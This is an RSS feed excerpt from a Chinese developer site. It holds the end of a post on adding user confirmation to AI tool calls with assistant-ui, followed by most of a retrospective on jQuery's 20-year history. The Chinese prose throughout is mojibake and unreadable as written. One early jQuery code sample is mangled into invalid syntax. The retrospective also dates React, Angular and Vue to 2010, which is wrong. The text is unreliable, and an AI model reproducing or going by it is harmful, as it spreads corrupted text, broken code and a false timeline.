    å‰ç«¯-&gt;&gt;å‰ç«¯: resume("confirmed")
    å‰ç«¯-&gt;&gt;åç«¯: å‘é€å·¥å…·ç»“æœ
    åç«¯-&gt;&gt;AI: è½¬å‘ç»“æœ
    AI-&gt;&gt;åç«¯: "å¥½çš„ï¼Œå·²è®°å½•"
    åç«¯--&gt;&gt;å‰ç«¯: è¿”å›å›å¤
    å‰ç«¯-&gt;&gt;ç”¨æˆ·: æ˜¾ç¤ºå®Œæˆ
</code></pre>
<h3 data-id="heading-11">è¸©å‘è®°å½•</h3>
<h4 data-id="heading-12">å‘ 1ï¼š<code>Tool call is not waiting for human input</code></h4>
<p><strong>åŸå› </strong>ï¼šæ²¡åœ¨ <code>execute</code> é‡Œè°ƒç”¨ <code>human()</code>ï¼Œæˆ–è€…åœ¨é”™è¯¯çŠ¶æ€ä¸‹è°ƒç”¨äº† <code>resume()</code></p>
<p><strong>è§£å†³</strong>ï¼šç¡®ä¿ <code>execute</code> é‡Œæœ‰ <code>await human()</code>ï¼Œä¸”åªåœ¨ <code>status.type === "requires-action"</code> æ—¶è°ƒç”¨ <code>resume()</code></p>
<h4 data-id="heading-13">å‘ 2ï¼šå·¥å…·å®Œæˆåæ¶ˆæ¯æ— é™å‘é€</h4>
<p><strong>åŸå› </strong>ï¼š<code>sendAutomaticallyWhen</code> å¯¹åŒä¸€ä¸ªå·¥å…·è°ƒç”¨é‡å¤è¿”å› <code>true</code></p>
<p><strong>è§£å†³</strong>ï¼šç”¨ <code>useRef</code> è®°å½•å·²å¤„ç†çš„ <code>toolCallId</code></p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-keyword">const</span> processedToolCalls = <span class="hljs-title function_">useRef</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>&lt;<span class="hljs-built_in">string</span>&gt;());

<span class="hljs-attr">sendAutomaticallyWhen</span>: <span class="hljs-function">(<span class="hljs-params">options</span>) =&gt;</span> {
  <span class="hljs-comment">// ... æ‰¾åˆ°å®Œæˆçš„å·¥å…·è°ƒç”¨</span>
  <span class="hljs-keyword">if</span> (!processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">has</span>(toolCallId)) {
    processedToolCalls.<span class="hljs-property">current</span>.<span class="hljs-title function_">add</span>(toolCallId);
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  }
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<h4 data-id="heading-14">å‘ 3ï¼šç”¨é”™äº† <code>makeAssistantToolUI</code></h4>
<p><code>makeAssistantToolUI</code> åªæ¸²æŸ“ UIï¼Œä¸ä¼šæŠŠå·¥å…·å®šä¹‰å‘ç»™åç«¯ã€‚å¦‚æœéœ€è¦ AI èƒ½è°ƒç”¨ï¼Œå¿…é¡»ç”¨ <code>makeAssistantTool</code>ã€‚</p>
<h3 data-id="heading-15">æ€»ç»“</h3>
<p>é€šè¿‡ <code>assistant-ui</code> çš„å‰ç«¯å·¥å…·æœºåˆ¶ï¼Œæˆ‘ä»¬å®ç°äº†ï¼š</p>
<ol>
<li><strong>AI èƒ½åŠ›ä¸æ‰“æŠ˜</strong>ï¼šAI ä»ç„¶å¯ä»¥å†³å®šä½•æ—¶è°ƒç”¨å·¥å…·</li>
<li><strong>ç”¨æˆ·æœ‰æ§åˆ¶æƒ</strong>ï¼šæ•æ„Ÿæ“ä½œå¿…é¡»ç»è¿‡ç”¨æˆ·ç¡®è®¤</li>
<li><strong>ä½“éªŒå¾ˆè‡ªç„¶</strong>ï¼šç¡®è®¤æ¡†åµŒå…¥åœ¨å¯¹è¯æµä¸­ï¼Œä¸çªå…€</li>
</ol>
<p>è¿™å¥—æ–¹æ¡ˆå·²ç»åœ¨ç”Ÿäº§ç¯å¢ƒç¨³å®šè¿è¡Œï¼Œç”¨æˆ·å†ä¹Ÿä¸ç”¨æ‹…å¿ƒ AI "æ‰‹æ»‘"äº† ğŸ˜„</p>
<hr/>
<p><strong>æŠ€æœ¯æ ˆ</strong>ï¼šReact + Rust + Tauri + assistant-ui</p>
<p>å¦‚æœä½ ä¹Ÿåœ¨åš AI åº”ç”¨ï¼Œéœ€è¦äººæœºåä½œçš„åœºæ™¯ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼</p>
<p>æ¬¢è¿è¯„è®ºåŒºäº¤æµ ğŸ‘‡</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[å›é¦– jQuery 20 å¹´ï¼šä»è¾‰ç…Œåˆ°æ²¡è½]]></title>    <link>https://juejin.cn/post/7597259271110246440</link>    <guid>https://juejin.cn/post/7597259271110246440</guid>    <pubDate>2026-01-20T10:53:20.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597259271110246440" data-draft-id="7597243334176882728" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="å›é¦– jQuery 20 å¹´ï¼šä»è¾‰ç…Œåˆ°æ²¡è½"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,jQuery"/> <meta itemprop="datePublished" content="2026-01-20T10:53:20.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="å†´ç¾½"/> <meta itemprop="url" content="https://juejin.cn/user/712139234359182"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            å›é¦– jQuery 20 å¹´ï¼šä»è¾‰ç…Œåˆ°æ²¡è½
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/712139234359182/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    å†´ç¾½
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:53:20.000Z" title="Tue Jan 20 2026 10:53:20 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>2006 å¹´ 1 æœˆ 14 æ—¥ï¼ŒJohn Resig å‘å¸ƒäº†åä¸º jQuery çš„ JavaScript åº“ã€‚</p>
<p><strong>è‡³ä»Šå·²ç»è¿‡å»äº† 20 å¹´ï¼</strong></p>
<p>20 å‘¨å¹´ä¹‹é™…ï¼ŒjQuery 4.0 æ­£å¼å‘å¸ƒäº†ï¼</p>
<p>æ˜¯çš„ï¼Œå°±æ˜¯é‚£ä¸ªè¢«æ— æ•°äººå®£å¸ƒâ€œå·²æ­»â€çš„ jQueryï¼Œç»è¿‡ 10 å¹´çš„ç­‰å¾…åè¿æ¥äº†é‡å¤§æ›´æ–°ã€‚</p>
<p>æ›´è®©äººæ„æƒ³ä¸åˆ°çš„æ˜¯ï¼Œæ ¹æ® W3Techs çš„æ•°æ®ï¼Œ<strong>jQuery ä»ç„¶è¢«å…¨çƒ 78% çš„ç½‘ç«™ä½¿ç”¨</strong>ã€‚</p>
<p>è¿™ä¸ªæ•°å­—æ„å‘³ç€ä»€ä¹ˆï¼Ÿ</p>
<p>åœ¨ Reactã€Vueã€Angular ç­‰ç°ä»£æ¡†æ¶æ¨ªè¡Œçš„ä»Šå¤©ï¼Œé‚£ä¸ªæ›¾ç»è¢«æˆ‘ä»¬å«Œå¼ƒâ€œè€æ‰ç‰™â€çš„ jQueryï¼Œä¾ç„¶åœ¨äº’è”ç½‘çš„è§’è½é‡Œé»˜é»˜å‘å…‰å‘çƒ­ã€‚</p>
<p>ä» 2006 å¹´ John Resig åœ¨ BarCampNYC å¤§ä¼šä¸Šé¦–æ¬¡å‘å¸ƒï¼Œåˆ°ä»Šå¤© 4.0 ç‰ˆæœ¬çš„ç°ä»£åŒ–é‡ç”Ÿï¼ŒjQuery èµ°è¿‡äº†æ•´æ•´ 20 å¹´ã€‚</p>
<p><strong>å®ƒä¸ä»…æ˜¯ä¸€ä¸ª JavaScript åº“ï¼Œæ›´æ˜¯ä¸€ä¸ªæ—¶ä»£çš„ç¼©å½±ï¼Œè§è¯äº†å‰ç«¯æŠ€æœ¯ä»æ··æ²Œåˆ°ç¹è£çš„å®Œæ•´å†ç¨‹ã€‚</strong></p>
<p>æœ¬ç¯‡è®©æˆ‘ä»¬ä¸€èµ·å›é¡¾ jQuery çš„ 20 å¹´ï¼Œè§è¯å®ƒçš„è¾‰ç…Œä¸æ²¡è½ã€‚</p>
<h2 data-id="heading-0">1. æ··æ²Œæ—¶ä»£</h2>
<p>å›æœ› 2006 å¹´ï¼Œå½¼æ—¶æ­£å€¼ç¬¬ä¸€æ¬¡æµè§ˆå™¨æˆ˜äº‰çš„å°¾å£°ï¼Œå¾®è½¯ IE ä¸ç½‘æ™¯ Navigator åˆšåˆšæ‰“å®Œä»—ï¼Œä½†é—ç•™ä¸‹æ¥çš„å…¼å®¹æ€§é—®é¢˜å´è®©æ— æ•°å‰ç«¯å¼€å‘è€…å¤´ç–¼ä¸å·²ã€‚</p>
<p>å½“æ—¶å¼€å‘è€…éœ€è¦é¢å¯¹å„ç§æµè§ˆå™¨çš„â€œå¥‡æŠ€æ·«å·§â€ï¼Œå…‰æ˜¯ä¸€ä¸ªäº‹ä»¶ç»‘å®šå°±è¦å†™ä¸€å¤§ä¸²å…¼å®¹ä»£ç ã€‚</p>
<p>æ¥çœ‹çœ‹è¿™æ®µæ—©æœŸçš„ jQuery æºç ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// å¦‚æœä½¿ç”¨Mozilla</span>
<span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"mozilla"</span> || jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"opera"</span>) {
    jQuery.<span class="hljs-property">event</span>.<span class="hljs-title function_">add</span>(<span class="hljs-variable language_">document</span>, <span class="hljs-string">"DOMContentLoaded"</span>, jQuery.<span class="hljs-property">ready</span>);
}
<span class="hljs-comment">// å¦‚æœä½¿ç”¨IE</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"msie"</span>) {
    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">write</span>(<span class="hljs-string">"&lt;scr"</span> +=<span class="hljs-string">""</span> <span class="hljs-string">"ipt="</span><span class="hljs-string">" id="</span>__ie_init<span class="hljs-string">" defer="</span><span class="hljs-literal">true</span><span class="hljs-string">" "</span>=<span class="hljs-string">""</span> <span class="hljs-string">"src="</span><span class="hljs-attr">javascript</span>:<span class="hljs-title function_">void</span>(<span class="hljs-number">0</span>)<span class="hljs-string">"&gt;&lt;\/script&gt;"</span>);
    <span class="hljs-keyword">var</span> script = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"__ie_init"</span>);
    script.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) jQuery.<span class="hljs-title function_">ready</span>();
    };
}
<span class="hljs-comment">// å¦‚æœä½¿ç”¨Safari</span>
<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (jQuery.<span class="hljs-property">browser</span> == <span class="hljs-string">"safari"</span>) {
    jQuery.<span class="hljs-property">safariTimer</span> = <span class="hljs-built_in">setInterval</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"/>){
        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"loaded"</span> || <span class="hljs-variable language_">document</span>.<span class="hljs-property">readyState</span> == <span class="hljs-string">"complete"</span>) {
            <span class="hljs-built_in">clearInterval</span>(jQuery.<span class="hljs-property">safariTimer</span>);
            jQuery.<span class="hljs-title function_">ready</span>();
        }
    }, <span class="hljs-number">10</span>);
}
&lt;/scr<span class="hljs-string">"&gt;

</span></code></pre>
<p>çœ‹åˆ°æ²¡ï¼Ÿä»…ä»…æ˜¯å¤„ç†é¡µé¢åŠ è½½äº‹ä»¶å°±è¦å†™è¿™ä¹ˆå¤šå…¼å®¹ä»£ç ï¼è¿™åœ¨ä»Šå¤©æ˜¯éš¾ä»¥æƒ³è±¡çš„ã€‚</p>
<h2 data-id="heading-1">2. æ¨ªç©ºå‡ºä¸–</h2>
<p>å°±åœ¨è¿™æ—¶ï¼ŒjQuery æ¨ªç©ºå‡ºä¸–ï¼Œå½»åº•æ”¹å˜äº†æ¸¸æˆè§„åˆ™ã€‚</p>
<p>John Resig æå‡ºäº†ä¸€ä¸ªç®€å•è€Œä¼˜é›…çš„ç†å¿µï¼š</p>
<blockquote>
<p><strong>Write Lessï¼ŒDo More</strong></p>
</blockquote>
<p>jQuery é€šè¿‡ç²¾ç®€å¸¸è§çš„é‡å¤æ€§ä»»åŠ¡ï¼Œå»é™¤æ‰€æœ‰ä¸å¿…è¦çš„æ ‡è®°ï¼Œä½¿ä»£ç ç®€æ´ã€é«˜æ•ˆä¸”æ˜“äºç†è§£ï¼Œä»è€Œå®ç°è¿™ä¸€ç›®æ ‡ã€‚</p>
<p>jQuery å¸¦æ¥äº†ä¸¤å¤§é©å‘½æ€§æ”¹å˜ï¼š</p>
<ol>
<li><strong>å¼ºå¤§çš„é€‰æ‹©å™¨å¼•æ“</strong>ï¼šä¸å†å±€é™äºç®€å•çš„ ID å’Œç±»é€‰æ‹©ï¼Œå¯ä»¥è¿›è¡Œå¤æ‚çš„å…³ç³»é€‰æ‹©</li>
<li><strong>ä¼˜é›…çš„ API è®¾è®¡</strong>ï¼šé“¾å¼æ“ä½œè®©ä»£ç æ—¢ç®€æ´åˆæ˜“è¯»</li>
</ol>
<p>çœ‹çœ‹è¿™ä¸ªå¯¹æ¯”ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ä¼ ç»ŸDOMæ“ä½œ</span>
<span class="hljs-keyword">var</span> elements = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">"contacts"</span>).<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"ul"</span>)[<span class="hljs-number">0</span>].<span class="hljs-title function_">getElementsByClassName</span>(<span class="hljs-string">"people"</span>);
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; elements.<span class="hljs-property">length</span>; i++) {
  <span class="hljs-keyword">var</span> items = elements[i].<span class="hljs-title function_">getElementsByTagName</span>(<span class="hljs-string">"li"</span>);
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> j = <span class="hljs-number">0</span>; j &lt; items.<span class="hljs-property">length</span>; j++) {
    <span class="hljs-comment">// æ“ä½œæ¯ä¸ªitem</span>
  }
}

<span class="hljs-comment">// jQueryæ–¹å¼</span>
$(<span class="hljs-string">"#contacts ul.people li"</span>).<span class="hljs-title function_">each</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-comment">// æ“ä½œæ¯ä¸ªitem</span>
});
</code></pre>
<p>å·®è·ä¸€ç›®äº†ç„¶ï¼</p>
<p>jQuery çš„å‡ºç°è®©å‰ç«¯å¼€å‘å˜å¾—å¦‚æ­¤ä¼˜é›…ï¼Œä»¥è‡³äºè¿…é€Ÿåœ¨å¼€å‘è€…ç¾¤ä½“ä¸­ä¼ æ’­å¼€æ¥ã€‚</p>
<h2 data-id="heading-2">3. è¾‰ç…Œå²æœˆ</h2>
<p>éšç€ jQuery çš„æ™®åŠï¼Œä¸€ä¸ªåºå¤§çš„æ’ä»¶ç”Ÿæ€è¿…é€Ÿå»ºç«‹èµ·æ¥ã€‚</p>
<p>ä»æ—¥æœŸé€‰æ‹©å™¨åˆ°è½®æ’­å›¾ï¼Œä»è¡¨å•éªŒè¯åˆ°åŠ¨ç”»æ•ˆæœï¼Œå‡ ä¹ä½ èƒ½æƒ³åˆ°çš„åŠŸèƒ½éƒ½æœ‰å¯¹åº”çš„ jQuery æ’ä»¶ã€‚</p>
<p>é‚£æ—¶å€™å‰ç«¯å¼€å‘çš„æ ‡å‡†æµç¨‹æ˜¯ï¼š</p>
<ol>
<li>ä¸‹è½½ jQuery æ ¸å¿ƒåº“</li>
<li>æœç´¢å¹¶ä¸‹è½½æ‰€éœ€çš„ jQuery æ’ä»¶</li>
<li>ç»„åˆè¿™äº›æ’ä»¶å®Œæˆé¡¹ç›®</li>
</ol>
<p>åŒæ—¶ï¼ŒjQuery çš„ç®¡ç†ä¹Ÿå˜å¾—æ­£å¼ã€‚</p>
<p>2011 å¹´ï¼ŒjQuery å›¢é˜Ÿæ­£å¼æˆç«‹äº† jQuery ç†äº‹ä¼šã€‚2012 å¹´ï¼ŒjQuery ç†äº‹ä¼šæˆç«‹äº† jQuery åŸºé‡‘ä¼šã€‚</p>
<h2 data-id="heading-3">4. å½±å“æ·±è¿œ</h2>
<p>jQuery çš„å½±å“åŠ›è¿œè¿œè¶…å‡ºäº†æŠ€æœ¯æœ¬èº«ï¼Œå®ƒæ¨åŠ¨äº†æ•´ä¸ªå‰ç«¯è¡Œä¸šçš„å‘å±•ï¼š</p>
<ul>
<li>**å¤§å¹…é™ä½äº†å‰ç«¯å¼€å‘çš„é—¨æ§›ï¼š**è®©æ›´å¤šçš„å¼€å‘è€…èƒ½å¤Ÿå‚ä¸åˆ°å‰ç«¯å¼€å‘ä¸­æ¥</li>
<li><strong>æå‡äº†å‰ç«¯å·¥ç¨‹å¸ˆçš„ç¤¾ä¼šåœ°ä½</strong>ï¼šè®©å‰ç«¯å¼€å‘å˜å¾—æ›´åŠ ä¸“ä¸šå’Œé‡è¦</li>
<li><strong>ä¿ƒè¿›äº†æµè§ˆå™¨å‚å•†çš„æ ‡å‡†åŒ–</strong>ï¼šjQuery çš„æˆåŠŸè¯æ˜äº†ç»Ÿä¸€ API çš„é‡è¦æ€§</li>
<li><strong>å‚¬ç”Ÿäº†ç°ä»£å‰ç«¯å·¥å…·é“¾</strong>ï¼šä¸ºåæ¥çš„æ¨¡å—åŒ–ã€æ„å»ºå·¥å…·å¥ å®šäº†åŸºç¡€</li>
</ul>
<p>ç”šè‡³è¿ jQuery çš„é€‰æ‹©å™¨å¼•æ“ Sizzle åæ¥éƒ½è¢«æå–å‡ºæ¥ï¼Œå½±å“äº†æ•´ä¸ªé€‰æ‹©å™¨æ ‡å‡†çš„å‘å±•ã€‚</p>
<h2 data-id="heading-4">5. ä»·å€¼åŠ¨æ‘‡</h2>
<p>jQuery ä¹‹æ‰€ä»¥èƒ½å¤Ÿå¿«é€Ÿæ™®åŠï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯å› ä¸ºæµè§ˆå™¨çš„â€œä¸äº‰æ°”â€ã€‚</p>
<p>è€Œå½“æµè§ˆå™¨å‚å•†å¼€å§‹è®¤çœŸå¯¹å¾…æ ‡å‡†åŒ–é—®é¢˜æ—¶ï¼ŒjQuery çš„æ ¸å¿ƒä»·å€¼å°±å¼€å§‹åŠ¨æ‘‡äº†ã€‚</p>
<p>2009 å¹´åï¼Œæµè§ˆå™¨æ ‡å‡†åŒ–è¿›ç¨‹å¤§å¹…åŠ é€Ÿï¼š</p>
<ul>
<li><code>querySelector</code>å’Œ<code>querySelectorAll</code>çš„å‡ºç°</li>
<li><code>classList</code> API çš„æ™®åŠ</li>
<li><code>fetch</code> API æ›¿ä»£ Ajax éœ€æ±‚</li>
<li>CSS3 åŠ¨ç”»æ›¿ä»£ JavaScript åŠ¨ç”»</li>
</ul>
<p>ç°ä»£æµè§ˆå™¨ API çš„å®Œå–„ï¼Œè®©å¾ˆå¤š jQuery åŠŸèƒ½éƒ½æœ‰äº†åŸç”Ÿæ›¿ä»£å“ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// jQueryæ–¹å¼</span>
$(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">on</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> $(<span class="hljs-string">"#box"</span>).<span class="hljs-title function_">addClass</span>(<span class="hljs-string">"active"</span>));

<span class="hljs-comment">// åŸç”Ÿæ–¹å¼</span>
<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#btn"</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">"click"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">"#box"</span>).<span class="hljs-property">classList</span>.<span class="hljs-title function_">add</span>(<span class="hljs-string">"active"</span>);
});
</code></pre>
<p>ä½ å¯ä»¥å‘ç°ï¼Œå·®è·å·²ç»ä¸å†é‚£ä¹ˆæ˜æ˜¾ï¼</p>
<h2 data-id="heading-5">6. æ¡†æ¶æ‰“å‡»</h2>
<p>2010 å¹´ï¼ŒReactã€Angularã€Vue ç­‰ç°ä»£æ¡†æ¶ç›¸ç»§ç™»åœºï¼Œå¸¦æ¥äº†é©å‘½æ€§çš„å˜åŒ–ï¼š</p>
<ol>
<li><strong>ç»„ä»¶åŒ–æ€ç»´</strong>ï¼šä» DOM æ“ä½œè½¬å‘ç»„ä»¶æ„å»º</li>
<li><strong>å£°æ˜å¼ç¼–ç¨‹</strong>ï¼šæè¿°â€œä»€ä¹ˆâ€è€Œä¸æ˜¯â€œå¦‚ä½•â€</li>
<li><strong>çŠ¶æ€ç®¡ç†</strong>ï¼šè§£å†³äº†å¤æ‚åº”ç”¨çš„ç»´æŠ¤é—®é¢˜</li>
<li><strong>å·¥å…·é“¾å®Œå–„</strong>ï¼šä»æ„å»ºåˆ°éƒ¨ç½²çš„å®Œæ•´è§£å†³æ–¹æ¡ˆ</li>
</ol>
<p>è¿™äº›æ¡†æ¶ä»æ¶æ„å±‚é¢è§£å†³äº† jQuery æ—¶ä»£çš„é—®é¢˜ï¼Œå°±åƒä»æ‰‹å·¥åˆ¶ä½œè½¬å‘äº†å·¥ä¸šåŒ–ç”Ÿäº§ã€‚</p>
<h2 data-id="heading-6">7. æƒ¨é­èƒŒå›</h2>
<p>2018 å¹´ï¼ŒGitHub å…¬å¼€å®£å¸ƒä»å…¶å‰ç«¯ç§»é™¤ jQueryï¼Œè¿™ä¸ªæ ‡å¿—æ€§äº‹ä»¶è¢«å¹¿æ³›è§£è¯»ä¸ºâ€œjQuery æ—¶ä»£çš„ç»ˆç»“â€ã€‚</p>
<p>GitHub åœ¨åšå®¢ä¸­è¯¦ç»†è¯´æ˜äº†è¿ç§»çš„ç†ç”±ï¼šç°ä»£æµè§ˆå™¨ API å·²ç»è¶³å¤Ÿå®Œå–„ï¼ŒReact çš„ç»„ä»¶åŒ–æ¨¡å¼æ›´é€‚åˆå¤§å‹åº”ç”¨çš„ç»´æŠ¤ã€‚</p>
<p>è¿™ä¸ªâ€œèƒŒå›â€å¯¹ jQuery çš„å£°èª‰é€ æˆäº†é‡å¤§æ‰“å‡»ï¼Œä¹ŸåŠ é€Ÿäº†å®ƒåœ¨æ–°æŠ€æœ¯æ ˆä¸­çš„è¡°è½ã€‚</p>
<h2 data-id="heading-7">8. ç˜¦æ­»éª†é©¼</h2>
<p>å°½ç®¡åœ¨æŠ€æœ¯å‰æ²¿é¢†åŸŸå¤±åŠ¿ï¼Œä½† jQuery åœ¨<strong>å­˜é‡å¸‚åœº</strong>ä¸­çš„åœ°ä½ä¾ç„¶ç¨³å›ºï¼š</p>
<ul>
<li><strong>78% çš„é¡¶çº§ç½‘ç«™</strong>ä»åœ¨ä½¿ç”¨ jQuery</li>
